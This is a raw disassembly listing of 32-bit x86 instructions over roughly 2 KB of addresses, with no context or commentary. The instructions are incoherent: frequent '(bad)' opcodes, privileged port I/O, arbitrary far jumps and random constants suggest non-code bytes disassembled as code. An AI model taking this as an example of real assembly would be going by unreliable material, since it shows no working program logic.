  417cd7:	fcmovb st,st(1)
  417cd9:	inc    ecx
  417cda:	adc    al,0xe3
  417cdc:	push   ebx
  417cdd:	icebp  
  417cde:	dec    edx
  417cdf:	in     al,dx
  417ce0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ce1:	loope  0x417d51
  417ce3:	out    dx,al
  417ce4:	mov    cl,0xcc
  417ce7:	adc    ecx,DWORD PTR [esi+0x2b0f4c2c]
  417ced:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cee:	push   esp
  417cef:	adc    al,0x55
  417cf1:	or     BYTE PTR [edi+0x3ce03a56],ah
  417cf7:	imul   dl
  417cf9:	mov    esp,0xdf1cc698
  417cfe:	(bad)  
  417cff:	dec    esp
  417d00:	data16 mov bh,dh
  417d03:	add    eax,0xfb7fba90
  417d08:	dec    esp
  417d09:	sahf   
  417d0a:	ins    DWORD PTR es:[edi],dx
  417d0b:	xchg   ebp,eax
  417d0c:	xor    DWORD PTR [ebp+ebx*2+0x3a2ca78],edi
  417d13:	into   
  417d14:	push   ebx
  417d15:	adc    bl,BYTE PTR [edi+edx*8+0x48]
  417d19:	xchg   esp,eax
  417d1a:	into   
  417d1b:	mov    WORD PTR [edx-0x10],es
  417d1e:	out    dx,al
  417d1f:	cmp    DWORD PTR [esi-0x3185377c],ebp
  417d25:	lahf   
  417d26:	imul   esi,DWORD PTR [ecx+eax*1+0x4b],0x1e
  417d2b:	repz shl DWORD PTR [esi],1
  417d2e:	xchg   edi,eax
  417d2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d30:	add    DWORD PTR [ecx-0x5ffe3ed8],eax
  417d36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d37:	jmp    0x417cf3
  417d39:	retf   0xaeeb
  417d3c:	test   eax,0x968ab03b
  417d41:	cs cmp eax,0x88b83341
  417d47:	xor    esi,ecx
  417d49:	cmp    cl,ah
  417d4b:	jmp    0x94f7:0xf4c00122
  417d52:	ins    DWORD PTR es:[edi],dx
  417d53:	sbb    esp,DWORD PTR [ebx+esi*4]
  417d56:	and    eax,0x280c93d8
  417d5b:	sub    BYTE PTR [ebx+0x5b0c2f3a],dl
  417d61:	(bad)  
  417d62:	pop    ebx
  417d63:	xor    bl,BYTE PTR [esi-0x6aee9e5f]
  417d69:	xchg   ecx,eax
  417d6a:	jae    0x417d1a
  417d6c:	pop    ebp
  417d6d:	mov    ebp,DWORD PTR [edx+0x10]
  417d70:	xor    eax,0x6affeecb
  417d75:	and    cl,BYTE PTR [edx]
  417d77:	sub    DWORD PTR [edi+0x6d],ebp
  417d7a:	and    al,BYTE PTR [esi-0xaac68b4]
  417d80:	sbb    cl,dh
  417d82:	mov    esp,0xb35ad8fb
  417d87:	cs jl  0x417d26
  417d8a:	dec    edx
  417d8b:	jne    0x417db7
  417d8d:	jle    0x417dea
  417d8f:	mov    edi,gs
  417d91:	in     eax,0xd9
  417d93:	call   0xf742a199
  417d98:	or     al,0xae
  417d9a:	xchg   ecx,edi
  417d9c:	in     eax,dx
  417d9d:	mov    ecx,0x5bb8bba8
  417da2:	sub    BYTE PTR [eax+0x6c51102c],bl
  417da8:	add    BYTE PTR [esi],bh
  417daa:	pop    ebx
  417dab:	push   ebp
  417dac:	dec    esp
  417dad:	bound  esp,QWORD PTR ds:0x66876592
  417db3:	rol    BYTE PTR ds:0x26395ccd,1
  417db9:	sti    
  417dba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417dbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417dbc:	fbld   TBYTE PTR [edx-0x27]
  417dbf:	leave  
  417dc0:	shr    BYTE PTR [ecx],0x44
  417dc3:	push   ebx
  417dc4:	mov    esp,0x11da1568
  417dc9:	sti    
  417dca:	add    ch,BYTE PTR [ebp+0x595454e7]
  417dd0:	cld    
  417dd1:	imul   eax,DWORD PTR [ecx-0x4d32dbc3],0xffffff90
  417dd8:	cmp    eax,edx
  417dda:	enter  0x5e93,0xeb
  417dde:	gs pop ss
  417de0:	jns    0x417e09
  417de2:	jge    0x417d9b
  417de4:	xchg   esp,eax
  417de5:	and    DWORD PTR [eax+0xf],ebp
  417de8:	test   eax,0x91605038
  417ded:	xchg   esp,eax
  417dee:	push   ecx
  417def:	clc    
  417df0:	push   ecx
  417df1:	popf   
  417df2:	xchg   ebx,eax
  417df3:	push   edx
  417df4:	int    0x41
  417df6:	push   ebx
  417df7:	pushf  
  417df8:	out    0xa6,eax
  417dfa:	mov    BYTE PTR [edi],cl
  417dfc:	sub    eax,DWORD PTR [edi-0x39e094de]
  417e02:	int3   
  417e03:	stos   BYTE PTR es:[edi],al
  417e04:	mov    al,cl
  417e06:	fcomp  st(1)
  417e08:	fstp   DWORD PTR [ebp-0x3dda7e42]
  417e0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e0f:	xchg   esp,eax
  417e10:	fidivr WORD PTR [edx]
  417e12:	cmp    eax,0xf1f27973
  417e17:	adc    ebx,DWORD PTR [eax-0x2499835e]
  417e1d:	and    eax,DWORD PTR [ecx]
  417e1f:	jmp    DWORD PTR [edx]
  417e21:	int3   
  417e22:	dec    ebx
  417e23:	sub    BYTE PTR [ecx-0x57],ch
  417e26:	dec    esi
  417e27:	mov    ds:0xa4aefd38,al
  417e2c:	pop    edi
  417e2d:	dec    BYTE PTR [eax+0x50]
  417e30:	jge    0x417e50
  417e32:	adc    edx,ebp
  417e34:	jne    0x417ea1
  417e36:	ss mov bl,0x42
  417e39:	cdq    
  417e3a:	lds    ecx,FWORD PTR [edi]
  417e3c:	adc    ecx,DWORD PTR [ecx-0x3c0211d0]
  417e42:	repnz daa 
  417e44:	lods   al,BYTE PTR ds:[esi]
  417e45:	retf   0x116a
  417e48:	sub    esi,edi
  417e4a:	shr    BYTE PTR [esi-0x3d],cl
  417e4d:	(bad)  
  417e4f:	fld    st(6)
  417e51:	inc    ecx
  417e52:	jae    0x417e91
  417e54:	int    0x1f
  417e56:	sbb    dh,0xd
  417e59:	arpl   WORD PTR [ecx-0x3476e07d],bp
  417e5f:	repnz or bh,bh
  417e62:	retf   0x9692
  417e65:	fcmove st,st(0)
  417e67:	dec    edi
  417e68:	fsubr  QWORD PTR [ebx-0x573149fd]
  417e6e:	mov    edx,0x2c973de4
  417e73:	cli    
  417e74:	repz aad 0x88
  417e77:	mov    al,ds:0x820cc624
  417e7c:	popa   
  417e7d:	jnp    0x417e58
  417e7f:	ret    0xbd10
  417e82:	fldcw  WORD PTR [edi]
  417e84:	and    DWORD PTR [edx+0x63321e4b],ebp
  417e8a:	add    eax,0xae909caa
  417e8f:	push   edi
  417e90:	out    0x4d,eax
  417e92:	hlt    
  417e93:	push   ebx
  417e94:	cmp    bh,bl
  417e96:	(bad)  
  417e97:	fimul  WORD PTR [ebp+0x55]
  417e9a:	(bad)
  417e9d:	dec    ebx
  417e9e:	mov    esp,0xe67d4506
  417ea3:	ret    0x80c3
  417ea6:	xchg   ecx,eax
  417ea7:	sub    bl,BYTE PTR [edx]
  417ea9:	inc    ebx
  417eaa:	add    BYTE PTR [ecx+0x310958c6],dl
  417eb0:	jge    0x417f29
  417eb2:	mov    al,ds:0xf8792116
  417eb7:	ins    DWORD PTR es:[edi],dx
  417eb8:	call   0x4831:0x1a896971
  417ebf:	push   0x74ad962e
  417ec4:	mov    edi,DWORD PTR [ecx]
  417ec6:	push   ds
  417ec7:	pop    edx
  417ec8:	sbb    eax,0xc414cbb5
  417ecd:	lods   al,BYTE PTR ds:[esi]
  417ece:	int3   
  417ecf:	xor    eax,0xe6d75cea
  417ed4:	mov    cl,0x94
  417ed6:	mov    al,BYTE PTR [eax]
  417ed8:	or     bh,BYTE PTR [edx-0xea769f8]
  417ede:	pop    edx
  417edf:	aas    
  417ee0:	outs   dx,BYTE PTR ds:[esi]
  417ee1:	or     bh,bl
  417ee3:	dec    edx
  417ee4:	fucomp st(0)
  417ee6:	jmp    0x7fec:0x97b7abe1
  417eed:	cmp    edx,DWORD PTR [edx+0x2c878420]
  417ef3:	test   al,0x5f
  417ef5:	mov    WORD PTR [esi],ds
  417ef7:	push   esp
  417ef8:	dec    esi
  417ef9:	dec    ecx
  417efa:	sbb    al,0xa
  417efc:	mov    dh,0x6c
  417efe:	out    0x40,eax
  417f00:	lods   al,BYTE PTR ds:[esi]
  417f01:	inc    esi
  417f02:	clc    
  417f03:	sbb    ebx,esp
  417f05:	mov    WORD PTR [edi+0x58],ds
  417f08:	add    ecx,ebx
  417f0a:	mov    ds:0x24de4949,eax
  417f0f:	(bad)  
  417f10:	div    BYTE PTR ds:0x193540f6
  417f16:	adc    eax,0xf38f9494
  417f1b:	ror    edx,0xf8
  417f1e:	stos   BYTE PTR es:[edi],al
  417f1f:	jae    0x417f7b
  417f21:	je     0x417f30
  417f23:	cmp    eax,0xc87178d3
  417f28:	push   edi
  417f29:	dec    ecx
  417f2a:	cwde   
  417f2b:	sbb    cl,BYTE PTR [ecx]
  417f2d:	xor    eax,0x7866578c
  417f32:	jp     0x417ef6
  417f34:	or     ch,BYTE PTR [edi-0x4883617e]
  417f3a:	sub    eax,0x16f65585
  417f3f:	mov    WORD PTR [ecx-0x73814a9f],fs
  417f45:	pop    ss
  417f46:	cwde   
  417f47:	dec    esi
  417f48:	ins    BYTE PTR es:[edi],dx
  417f49:	cmp    DWORD PTR [ebp-0x197ff176],eax
  417f4f:	cmc    
  417f50:	shr    BYTE PTR [ecx-0x2e06e65a],1
  417f56:	fidiv  WORD PTR [edi-0xe1c74c0]
  417f5c:	data16 js 0x417eef
  417f5f:	lahf   
  417f60:	or     BYTE PTR [edi+0x68],dh
  417f63:	ret    
  417f64:	data16 hlt 
  417f66:	ret    0xcb46
  417f69:	ins    BYTE PTR es:[edi],dx
  417f6a:	mov    bh,0xc2
  417f6c:	xchg   edx,eax
  417f6d:	sub    cl,BYTE PTR [eax+esi*8-0x41]
  417f71:	and    edi,ecx
  417f73:	mov    cl,0x6b
  417f75:	clc    
  417f76:	adc    eax,0x978450a7
  417f7b:	test   al,0x15
  417f7d:	xlat   BYTE PTR ds:[ebx]
  417f7e:	xor    BYTE PTR [ebx+0x7],al
  417f81:	mov    eax,0x5212fdae
  417f86:	add    al,0xbb
  417f88:	pop    esi
  417f89:	aas    
  417f8a:	fbld   TBYTE PTR [edx+0x47]
  417f8d:	add    dl,BYTE PTR [ebx+ecx*1+0x71]
  417f91:	push   es
  417f92:	sub    ecx,eax
  417f94:	aaa    
  417f95:	pop    esi
  417f96:	out    0x8a,eax
  417f98:	imul   esp,DWORD PTR [esi],0x3
  417f9b:	hlt    
  417f9c:	inc    esp
  417f9d:	(bad)  
  417f9e:	ror    DWORD PTR [edx],cl
  417fa0:	jns    0x417f91
  417fa2:	pop    esi
  417fa3:	cli    
  417fa4:	xlat   BYTE PTR ds:[ebx]
  417fa5:	jae    0x417f64
  417fa7:	(bad)  
  417fa9:	adc    eax,0x286da7ac
  417fae:	loopne 0x417f9a
  417fb0:	inc    esp
  417fb1:	dec    BYTE PTR [esi+edi*1+0x4d]
  417fb5:	retf   0xd7ac
  417fb8:	jno    0x417f85
  417fba:	out    0xf4,eax
  417fbc:	adc    edi,edi
  417fbe:	shl    cl,0x25
  417fc1:	mov    bh,0x1
  417fc3:	mov    cl,0xc6
  417fc5:	push   ebp
  417fc6:	shl    DWORD PTR [ecx-0x9fb481e],1
  417fcc:	sbb    eax,DWORD PTR [edx]
  417fce:	mov    eax,0xb706d73
  417fd3:	mov    cl,0x84
  417fd5:	es mov ah,0x1d
  417fd8:	lock pop esi
  417fda:	lahf   
  417fdb:	fwait
  417fdc:	dec    ebp
  417fdd:	int    0x86
  417fdf:	ret    
  417fe0:	mov    ds:0x9e18899d,al
  417fe5:	lahf   
  417fe6:	mov    esp,0xbebb42eb
  417feb:	mov    dh,0x0
  417fed:	out    0xe1,eax
  417fef:	into   
  417ff0:	mov    bl,0xc8
  417ff2:	out    0x9f,eax
  417ff4:	out    0xdc,al
  417ff6:	mov    cl,0x87
  417ff8:	adc    edi,edi
  417ffa:	mov    ah,0x2c
  417ffc:	sidtd  [eax+0x71]
  418000:	outs   dx,DWORD PTR ds:[esi]
  418001:	dec    ebx
  418002:	hlt    
  418003:	lods   al,BYTE PTR ds:[esi]
  418004:	enter  0xd13f,0x6d
  418008:	clc    
  418009:	jmp    0x8ccf730
  41800e:	adc    eax,0xf671f874
  418013:	rcr    DWORD PTR [edx],0xf5
  418016:	sub    ch,dl
  418018:	pusha  
  418019:	pop    es
  41801a:	inc    ebx
  41801b:	xchg   esi,eax
  41801c:	out    dx,eax
  41801d:	jle    0x417fce
  41801f:	xlat   BYTE PTR ss:[ebx]
  418021:	stos   BYTE PTR es:[edi],al
  418022:	sbb    BYTE PTR [edi],dl
  418024:	loope  0x41804e
  418026:	enter  0xa01,0x1f
  41802a:	jns    0x41804c
  41802c:	inc    edx
  41802d:	mov    ds:0x26cece75,al
  418032:	(bad)  
  418033:	xlat   BYTE PTR ds:[ebx]
  418034:	lds    ebp,FWORD PTR [esi]
  418036:	xchg   ecx,eax
  418037:	xchg   edi,eax
  418038:	fwait
  418039:	fs mov ecx,0x4a565d9e
  41803f:	ins    DWORD PTR es:[edi],dx
  418040:	xchg   BYTE PTR [ecx],ch
  418042:	inc    ebp
  418043:	hlt    
  418044:	sbb    BYTE PTR [edi+eiz*2+0xa],dh
  418048:	nop
  418049:	aam    0xe3
  41804b:	aam    0x2e
  41804d:	xchg   esi,eax
  41804e:	sbb    eax,0xf8ee804
  418053:	xchg   ebp,eax
  418054:	data16 mov WORD PTR [ebp+0x7c],fs
  418058:	or     DWORD PTR [eax+0x7c],esp
  41805b:	loopne 0x418080
  41805d:	lea    esp,[ebx]
  41805f:	pop    ds
  418060:	mov    DWORD PTR [edx+0x7b],ecx
  418063:	ret    
  418064:	sub    al,0x54
  418066:	cmp    dl,BYTE PTR [eax+0x66e85bf6]
  41806c:	xchg   ebp,eax
  41806d:	mov    edi,ebp
  41806f:	pushf  
  418070:	daa    
  418071:	test   eax,0xa7ff974f
  418076:	retf   0xe886
  418079:	xchg   ebx,eax
  41807a:	fucomp st(3)
  41807c:	mov    ds:0x5103e416,eax
  418081:	sbb    ebx,esp
  418083:	inc    ebx
  418084:	xor    BYTE PTR [ebp+0x2c],dh
  418087:	pop    es
  418088:	fdivp  st(0),st
  41808a:	lods   al,BYTE PTR ds:[esi]
  41808b:	sar    DWORD PTR [esi-0x46576a7c],1
  418091:	xor    BYTE PTR [esi+0xf],dl
  418094:	xchg   bl,dh
  418096:	or     DWORD PTR [esi-0xa],eax
  418099:	xchg   esp,eax
  41809a:	jns    0x41804e
  41809c:	jo     0x418067
  41809e:	mov    al,bl
  4180a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180a1:	mov    edi,0x74481b4f
  4180a6:	aad    0xaa
  4180a8:	iret   
  4180a9:	jp     0x418060
  4180ab:	in     eax,0x12
  4180ad:	mov    esi,0xe088a32
  4180b2:	or     al,BYTE PTR [esi]
  4180b4:	xchg   dl,bh
  4180b6:	cmp    ebp,DWORD PTR [ecx-0x5448db82]
  4180bc:	fwait
  4180bd:	cli    
  4180be:	xchg   ecx,eax
  4180bf:	mov    ebp,0xcb896aa3
  4180c4:	cli    
  4180c5:	into   
  4180c6:	pop    edi
  4180c7:	ret    0xed9c
  4180ca:	push   ecx
  4180cb:	fld    QWORD PTR [ebp+0x125fc76c]
  4180d1:	imul   esi,DWORD PTR [eax+0x42f30d28],0xc1b9623b
  4180db:	arpl   dx,di
  4180dd:	mov    al,ds:0xc5f7a6f3
  4180e2:	sub    BYTE PTR [eax-0x49],dh
  4180e5:	clc    
  4180e6:	jecxz  0x418128
  4180e8:	enter  0x3b6b,0x77
  4180ec:	mov    WORD PTR ds:0x1660ef06,?
  4180f2:	jmp    0x41812f
  4180f4:	push   esi
  4180f5:	or     eax,0x1df467bb
  4180fa:	stos   BYTE PTR es:[edi],al
  4180fb:	ins    DWORD PTR es:[edi],dx
  4180fc:	sbb    BYTE PTR [edx+0x52],bh
  4180ff:	in     al,0x5d
  418101:	(bad)  
  418102:	aam    0x92
  418104:	scas   al,BYTE PTR es:[edi]
  418105:	dec    edi
  418106:	sbb    ch,BYTE PTR [edx-0x55]
  418109:	inc    eax
  41810a:	jecxz  0x4180f9
  41810c:	mov    dh,0x3
  41810e:	and    ch,BYTE PTR [edx-0x46]
  418111:	aaa    
  418112:	jmp    0xff42497f
  418117:	mov    al,ds:0x95f4961e
  41811c:	pop    ss
  41811d:	(bad)  
  41811e:	scas   al,BYTE PTR es:[edi]
  41811f:	call   0x4c15ed4b
  418124:	mov    ch,0x33
  418126:	jae    0x418136
  418128:	xor    edx,DWORD PTR [esi+esi*1+0x319224b0]
  41812f:	inc    BYTE PTR [eax-0x75]
  418132:	mov    ds:0xbfb6f1b2,eax
  418137:	xchg   DWORD PTR [ebx-0x3],ecx
  41813a:	outs   dx,BYTE PTR ds:[esi]
  41813b:	(bad)  
  41813c:	push   eax
  41813d:	dec    ebp
  41813e:	mov    ds:0x6b3e0ae0,al
  418143:	nop
  418144:	jge    0x4181b5
  418146:	jo     0x41813d
  418148:	fisttp WORD PTR [eax]
  41814a:	aas    
  41814b:	mov    bh,0x9c
  41814d:	mov    ch,0x18
  41814f:	adc    al,0xda
  418151:	xchg   BYTE PTR [ecx],ah
  418153:	rcl    BYTE PTR [edi],0xee
  418156:	sbb    ebp,DWORD PTR [eax+edi*4-0x5ca0ff2c]
  41815d:	int3   
  41815e:	or     BYTE PTR [ecx-0x6bf9bed3],0xba
  418165:	test   BYTE PTR [ecx-0x4457babe],dl
  41816b:	stos   DWORD PTR es:[edi],eax
  41816c:	or     BYTE PTR [edx],dl
  41816e:	inc    eax
  41816f:	loopne 0x418125
  418171:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418172:	xor    dl,cl
  418174:	inc    eax
  418175:	and    bh,dl
  418177:	jne    0x4181de
  418179:	xchg   DWORD PTR [edx+0x7269e10a],ebp
  41817f:	jb     0x4181e1
  418181:	adc    DWORD PTR [esi+0x42],esi
  418184:	ret    
  418185:	rcr    DWORD PTR [edi-0x2501cfb3],cl
  41818b:	stos   DWORD PTR es:[edi],eax
  41818c:	inc    ebx
  41818d:	jnp    0x41812c
  41818f:	test   BYTE PTR ds:0x3f0ae8c5,0x9
  418196:	xor    al,0x14
  418198:	mov    bh,0x46
  41819a:	mov    eax,0x830a0e9d
  41819f:	in     eax,0x26
  4181a1:	popf   
  4181a2:	push   esi
  4181a3:	or     al,0x3c
  4181a5:	push   ebx
  4181a6:	mov    bl,BYTE PTR [edx]
  4181a8:	icebp  
  4181a9:	arpl   WORD PTR ds:0x2002987a,ax
  4181af:	dec    edx
  4181b0:	inc    eax
  4181b1:	sub    al,0x19
  4181b3:	dec    edi
  4181b4:	jg     0x4181e6
  4181b6:	add    ebx,eax
  4181b8:	push   edx
  4181b9:	mov    ecx,0x87f1073a
  4181be:	mov    dl,0xd0
  4181c0:	popf   
  4181c1:	mov    edi,0x4052617c
  4181c6:	xor    ecx,DWORD PTR [esi-0x16]
  4181c9:	js     0x4181da
  4181cb:	xor    cl,bh
  4181cd:	bound  ebp,QWORD PTR [edi]
  4181cf:	sbb    DWORD PTR [esi],esp
  4181d1:	sub    esp,edx
  4181d3:	(bad)  
  4181d5:	jae    0x418229
  4181d7:	into   
  4181d8:	test   DWORD PTR gs:[edx+eiz*8-0xe],esi
  4181dd:	push   esi
  4181de:	fist   WORD PTR [edx+0x5]
  4181e1:	popf   
  4181e2:	outs   dx,BYTE PTR ds:[esi]
  4181e3:	mov    ds:0xa550d351,al
  4181e8:	shr    DWORD PTR [ebp+eax*2+0x354bff5],0xf3
  4181f0:	mov    bh,0x12
  4181f2:	mov    al,ds:0x1180d992
  4181f7:	js     0x41821c
  4181f9:	sub    bh,ch
  4181fb:	fsubr  DWORD PTR [ebp-0x4dc85c95]
  418201:	test   ebp,edx
  418203:	add    esp,ebp
  418205:	push   ecx
  418206:	popf   
  418207:	lods   eax,DWORD PTR ds:[esi]
  418208:	lock push es
  41820a:	mov    ecx,0x28826ce4
  41820f:	xor    BYTE PTR [edi+0x3766758],al
  418215:	sbb    BYTE PTR [ebx-0x7b],dh
  418218:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418219:	mov    BYTE PTR [ecx-0x6025156c],bh
  41821f:	test   eax,0x74b1be5d
  418224:	out    dx,al
  418225:	inc    ebp
  418226:	xchg   edx,eax
  418227:	push   esi
  418228:	jno    0x41828b
  41822a:	mov    cs,WORD PTR ds:0x3385af11
  418230:	sar    bl,0x76
  418233:	pop    ds
  418234:	(bad)  
  418235:	js     0x418261
  418237:	mov    DWORD PTR [edi+0x4be953f0],ebp
  41823d:	mov    al,ds:0xc48183c0
  418242:	dec    edx
  418243:	ror    BYTE PTR [bx+di-0x2],0x53
  418248:	sti    
  418249:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41824a:	inc    edi
  41824b:	das    
  41824c:	add    ch,bl
  41824e:	outs   dx,BYTE PTR ds:[esi]
  41824f:	xchg   edi,eax
  418250:	in     eax,0x3f
  418252:	xchg   BYTE PTR [edi],dh
  418254:	outs   dx,BYTE PTR ds:[si]
  418256:	sbb    eax,DWORD PTR [edx+edi*8+0x1b2d6ecf]
  41825d:	mov    esp,DWORD PTR [ebp-0x7aa1792b]
  418263:	push   cs
  418264:	arpl   WORD PTR [ebp+0x7c],sp
  418267:	inc    ebx
  418268:	add    dh,dl
  41826a:	adc    DWORD PTR es:[eax],0xffffffc1
  41826e:	call   0xeb81:0xaac1ecc4
  418275:	push   esp
  418276:	mov    DWORD PTR [ebp+ebx*8+0x12],edi
  41827a:	jbe    0x41823b
  41827c:	dec    eax
  41827d:	cli    
  41827e:	test   DWORD PTR [ecx+0x774fbbc0],edx
  418284:	dec    eax
  418285:	or     DWORD PTR [edx-0xb],edi
  418288:	popa   
  418289:	mov    DWORD PTR [edi],ecx
  41828b:	nop
  41828c:	mov    bh,0x47
  41828e:	sub    DWORD PTR [esi+0x68],ecx
  418291:	(bad)  
  418292:	jmp    0x2c66:0xcd45210
  418299:	cs push ebx
  41829b:	js     0x41828f
  41829d:	aam    0x1
  41829f:	jle    0x418307
  4182a1:	inc    eax
  4182a2:	xor    eax,0xaac0e60f
  4182a7:	push   0x5f
  4182a9:	push   esi
  4182aa:	hlt    
  4182ab:	jecxz  0x4182a7
  4182ad:	stos   BYTE PTR es:[edi],al
  4182ae:	cs push ebp
  4182b0:	fnsave ds:0x7f3f3841
  4182b6:	push   eax
  4182b7:	xor    ah,BYTE PTR [edi]
  4182b9:	push   ds
  4182ba:	jle    0x418267
  4182bc:	daa    
  4182bd:	push   esi
  4182be:	xchg   ebx,eax
  4182bf:	sar    DWORD PTR [edx+esi*2-0x6c],0xc8
  4182c4:	int3   
  4182c5:	aad    0x57
  4182c7:	jb     0x4182a8
  4182c9:	jecxz  0x41830b
  4182cb:	mov    bl,al
  4182cd:	dec    esi
  4182ce:	xor    BYTE PTR [esi+0x33e33aee],bl
  4182d4:	jbe    0x418316
  4182d6:	test   al,0x18
  4182d8:	loope  0x4182ae
  4182da:	arpl   WORD PTR [edi],di
  4182dc:	out    dx,eax
  4182dd:	repnz sub BYTE PTR [ecx+0x1d9b1c0b],ah
  4182e4:	out    0x95,al
  4182e6:	iret   
  4182e7:	mov    ah,0x5
  4182e9:	jmp    FWORD PTR [ebp+0x58]
  4182ec:	es inc ecx
  4182ee:	and    BYTE PTR [ebx+0xc],0x39
  4182f2:	bound  eax,QWORD PTR [eax+0x7c]
  4182f5:	xchg   ebp,eax
  4182f6:	data16 fcomp DWORD PTR [ebx-0x8f473ba]
  4182fd:	stc    
  4182fe:	mov    ds:0x88f0ae6d,eax
  418303:	rcr    DWORD PTR [ecx+edi*2],cl
  418306:	aad    0x94
  418308:	(bad)  
  418309:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41830a:	rcl    DWORD PTR [eax-0x59ce9213],cl
  418310:	jae    0x418304
  418312:	jae    0x4182e3
  418314:	jp     0x41833e
  418316:	pop    es
  418317:	dec    esi
  418318:	push   cs
  418319:	scas   al,BYTE PTR es:[edi]
  41831a:	xor    al,0x7b
  41831c:	hlt    
  41831d:	xchg   esp,eax
  41831e:	lahf   
  41831f:	not    edi
  418321:	jns    0x418319
  418323:	mov    esi,0xafb1a377
  418328:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418329:	fist   WORD PTR [eax-0x76d3a5fa]
  41832f:	sbb    BYTE PTR [edi],0x94
  418332:	sub    dl,0x20
  418335:	and    ch,dh
  418337:	sub    eax,0x6614015e
  41833c:	adc    DWORD PTR [edx],ecx
  41833e:	xor    dh,BYTE PTR [esi+0x14]
  418341:	mov    ecx,0x84d7a4d0
  418346:	inc    eax
  418347:	loope  0x41839d
  418349:	mov    esi,0x6e0ef429
  41834e:	xchg   edi,eax
  41834f:	mov    dl,0x9e
  418351:	sbb    BYTE PTR [esi+0x2b],cl
  418354:	mov    al,0xf3
  418356:	not    ebp
  418358:	sub    bh,BYTE PTR [edx-0x6deda71a]
  41835e:	hlt    
  41835f:	xchg   BYTE PTR [edx],cl
  418361:	mov    esp,0x13138b33
  418366:	cmp    edi,DWORD PTR [edx-0xf0b07a2]
  41836c:	pop    esp
  41836d:	scas   eax,DWORD PTR es:[edi]
  41836e:	fadd   QWORD PTR [ebx]
  418370:	stos   BYTE PTR es:[edi],al
  418371:	int    0xe4
  418373:	retf   0x5056
  418376:	lds    ecx,FWORD PTR [ecx]
  418378:	mov    ds:0xf7a6aa47,al
  41837d:	sti    
  41837e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41837f:	test   eax,eax
  418381:	out    dx,eax
  418382:	(bad)  
  418383:	add    al,0x3f
  418385:	sbb    DWORD PTR [eax],ebp
  418387:	jg     0x418393
  418389:	in     al,0xf5
  41838b:	xchg   ecx,eax
  41838c:	xchg   esi,eax
  41838d:	mov    ebx,0x24b64926
  418392:	jae    0x418362
  418394:	stos   DWORD PTR es:[edi],eax
  418395:	rol    ebx,0x1f
  418398:	pop    ecx
  418399:	adc    cl,ah
  41839b:	aaa    
  41839c:	scas   al,BYTE PTR es:[edi]
  41839d:	int    0xa8
  41839f:	fwait
  4183a0:	pop    ss
  4183a1:	pop    ss
  4183a2:	div    ch
  4183a4:	xor    dl,BYTE PTR [esi-0x624c65e]
  4183aa:	iret   
  4183ab:	push   edi
  4183ac:	dec    esi
  4183ad:	sbb    ch,0xd7
  4183b0:	(bad)
  4183b3:	test   DWORD PTR [edx-0x7e172f95],edx
  4183b9:	call   0xe5686fab
  4183be:	fbstp  TBYTE PTR [ecx-0x7d]
  4183c1:	addr16 dec ebp
  4183c3:	popa   
  4183c4:	loop   0x418376
  4183c6:	sbb    esp,ecx
  4183c8:	cmp    BYTE PTR [edx-0x3ec708e7],bh
  4183ce:	ret    0x4e78
  4183d1:	(bad)  
  4183d2:	push   ebp
  4183d3:	dec    BYTE PTR ds:0x1eebc71
  4183d9:	into   
  4183da:	adc    DWORD PTR [eax],edi
  4183dc:	cld    
  4183dd:	rcr    ch,1
  4183df:	push   ecx
  4183e0:	mov    es,WORD PTR [ecx]
  4183e2:	into   
  4183e3:	cmp    DWORD PTR fs:[ecx],0xffffffc0
  4183e7:	bound  edx,QWORD PTR [edx+eiz*1]
  4183ea:	mov    al,0x47
  4183ec:	sub    cl,BYTE PTR [ebp+ebp*4+0x62807258]
  4183f3:	mov    bl,0xec
  4183f5:	lahf   
  4183f6:	mul    bh
  4183f8:	in     al,0xd2
  4183fa:	push   ebx
  4183fb:	shl    dh,0xa
  4183fe:	mov    cl,0xd
  418400:	mov    ds:0x64ed4428,eax
  418405:	lods   eax,DWORD PTR ds:[esi]
  418406:	movd   DWORD PTR [edi],mm6
  418409:	mov    WORD PTR [esi+0x1b572577],ss
  41840f:	outs   dx,BYTE PTR ds:[esi]
  418410:	daa    
  418411:	mul    BYTE PTR [ebx]
  418413:	popa   
  418414:	stos   BYTE PTR es:[edi],al
  418415:	ss jl  0x41845d
  418418:	imul   eax,DWORD PTR [ebx-0x525b3781],0x1a0469e6
  418422:	mov    ecx,0x3be96650
  418427:	loop   0x4183bc
  418429:	clc    
  41842a:	outs   dx,DWORD PTR ds:[esi]
  41842b:	ja     0x4183ee
  41842d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41842e:	xor    al,BYTE PTR [ebx]
  418430:	mov    dh,0x29
  418432:	ins    BYTE PTR es:[edi],dx
  418433:	pop    esp
  418434:	addr16 je 0x41844c
  418437:	lock mov ah,0x93
  41843a:	mov    ds:0x239db495,eax
  41843f:	jecxz  0x41842b
  418441:	imul   ebp,ebp,0x4f8b2eb5
  418447:	dec    eax
  418448:	mov    DWORD PTR [esp+ebp*8+0x9],0x45c271f5
  418450:	repz xchg ecx,eax
  418452:	shl    BYTE PTR [ecx+0x0],cl
  418455:	test   al,0xfe
  418457:	adc    eax,0x9d5f62cb
  41845c:	adc    al,0x20
  41845e:	push   0x15ad35e1
  418463:	hlt    
  418464:	adc    al,0x68
  418466:	sub    eax,0x29419a73
  41846b:	bound  esp,QWORD PTR ss:[ecx+0x555914aa]
  418472:	mov    esp,0x60ec1bae
  418477:	in     al,0xc3
  418479:	jns    0x41844f
  41847b:	add    eax,0x43074e74
  418480:	add    BYTE PTR [ecx],cl
  418482:	dec    edi
  418483:	add    al,0x49
  418485:	mov    ch,0xbd
  418487:	add    dl,ch
  418489:	arpl   dx,sp
  41848b:	aam    0xe5
  41848d:	push   ebx
  41848e:	mov    eax,ds:0x159979db
